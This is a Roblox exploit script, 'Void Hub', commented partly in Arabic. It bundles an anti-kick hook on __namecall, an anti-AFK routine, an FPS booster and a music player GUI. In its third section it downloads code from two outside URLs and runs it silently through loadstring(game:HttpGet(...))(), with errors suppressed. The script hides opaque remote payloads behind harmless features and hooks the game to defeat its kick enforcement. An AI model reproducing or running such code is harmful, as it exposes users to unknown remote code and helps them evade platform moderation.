--============================================================
-- VOID HUB - LIGHT EDITION (ANTI-KICK + FPS BOOST + MUSIC GUI)
--============================================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

--============================================================
-- 1. SAFE ANTI-KICK & ANTI-AFK (بدون ما يطردك)
--============================================================

-- منع الـ AFK Kick الآمن
player.Idled:Connect(function()
	local bb = game:GetService("VirtualInputManager")
	bb:SendKeyEvent(true, Enum.KeyCode.RightControl, false, game)
	task.wait(0.1)
	bb:SendKeyEvent(false, Enum.KeyCode.RightControl, false, game)
end)

-- حماية ضد الـ Local Kick
if hookmetamethod then
	local oldHM
	oldHM = hookmetamethod(game, "__namecall", function(self, ...)
		local method = getnamecallmethod()
		if tostring(method):lower() == "kick" and self == player then
			return nil
		end
		return oldHM(self, ...)
	end)
end

--============================================================
-- 2. AUTOMATIC FPS BOOST (تسريع اللعبة وخفض اللاج)
--============================================================

pcall(function()
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9
	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
	for _, v in ipairs(game:GetDescendants()) do
		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
			v.Material = Enum.Material.Plastic
			v.Reflectance = 0
		elseif v:IsA("Decal") or v:IsA("Texture") then
			v:Destroy()
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Enabled = false
		end
	end
end)

--============================================================
-- 3. RUN EXTERNAL SCRIPTS (السكريبتين بتوعك)
--============================================================

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/28bc742e3a8f491e8155a5c4327fd4dd.lua"))()
	end)
end)

task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dcon25o8"))()
	end)
end)

--============================================================
-- 4. MUSIC PLAYER GUI (قائمة الموسيقى مع زر فتح وإغلاق)
--============================================================

-- تنظيف الواجهات القديمة
local oldGui = PlayerGui:FindFirstChild("VoidHubMusicGui")
if oldGui then oldGui:Destroy() end

local musicGui = Instance.new("ScreenGui")
musicGui.Name = "VoidHubMusicGui"
musicGui.ResetOnSpawn = false
musicGui.Parent = PlayerGui

-- زر فتح/إغلاق القائمة (زر جانبي)
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.fromOffset(45, 45)
toggleBtn.Position = UDim2.new(0, 10, 0.5, -22)
toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
toggleBtn.Text = "🎵"
toggleBtn.TextSize = 22
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.ZIndex = 100
toggleBtn.Parent = musicGui

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = toggleBtn

local btnStroke = Instance.new("UIStroke")
btnStroke.Color = Color3.fromRGB(0, 170, 255)
btnStroke.Thickness = 2
btnStroke.Parent = toggleBtn

-- إطار قائمة الموسيقى
local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(220, 130)
frame.Position = UDim2.new(0, 65, 0.5, -65)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
frame.BorderSizePixel = 0
frame.Visible = false
frame.Parent = musicGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = frame

local frameStroke = Instance.new("UIStroke")
frameStroke.Color = Color3.fromRGB(35, 35, 45)
frameStroke.Thickness = 1.5
frameStroke.Parent = frame

-- عنوان الواجهة
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "VOID HUB MUSIC"
title.TextColor3 = Color3.fromRGB(0, 170, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.Parent = frame

-- زر تشغيل / إيقاف الموسيقى
local playBtn = Instance.new("TextButton")
playBtn.Size = UDim2.new(0.85, 0, 0, 35)
playBtn.Position = UDim2.new(0.075, 0, 0.35, 0)
playBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
playBtn.Text = "PLAY MUSIC 🔊"
playBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
playBtn.Font = Enum.Font.GothamBold
playBtn.TextSize = 12
playBtn.Parent = frame

local playCorner = Instance.new("UICorner")
playCorner.CornerRadius = UDim.new(0, 8)
playCorner.Parent = playBtn

-- نظام الصوت
local MUSIC_URL = "https://files.catbox.moe/nynv9p.mp3"
local MUSIC_FILE = "VoidHub_Music_Panel.mp3"
local currentSound = nil

local function getAudio()
	if currentSound then return currentSound end
	
	local asset
	pcall(function()
		if isfile and isfile(MUSIC_FILE) then
			asset = getcustomasset(MUSIC_FILE)
		end
	end)
	
	if not asset then
		local success, data = pcall(function() return game:HttpGet(MUSIC_URL) end)
		if success and data and #data > 1000 then
			pcall(function() writefile(MUSIC_FILE, data) end)
			pcall(function() asset = getcustomasset(MUSIC_FILE) end)
		end
	end
	
	if asset then
		currentSound = Instance.new("Sound")
		currentSound.SoundId = asset
		currentSound.Volume = 0.75
		currentSound.Looped = true
		currentSound.Parent = SoundService
	end
	return currentSound
end

-- تشغيل/إيقاف بالأزرار
playBtn.MouseButton1Click:Connect(function()
	local snd = getAudio()
	if snd then
		if snd.IsPlaying then
			snd:Pause()
			playBtn.Text = "PLAY MUSIC 🔊"
			playBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		else
			snd:Play()
			playBtn.Text = "PAUSE MUSIC 🔇"
			playBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		end
	end
end)

-- فتح وإغلاق قائمة الأغاني
toggleBtn.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
end)
